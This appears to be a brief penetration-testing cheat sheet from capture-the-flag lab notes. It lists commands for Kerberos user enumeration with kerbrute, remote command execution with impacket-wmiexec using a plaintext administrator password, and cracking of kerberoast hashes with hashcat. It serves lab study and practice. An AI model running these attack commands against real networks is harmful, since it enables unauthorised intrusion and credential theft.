#### Check to see if found users are valid with kerbrute:
```
./kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users
```


##### Login with kerberos credentials:
```
impacket-wmiexec active.htb/administrator/Ticketmaster1968@10.10.10.100
```
##### crack kerberos hash with hashcat:
```
hashcat -m 13100 hashes.kerberoast rockyou.txt
```
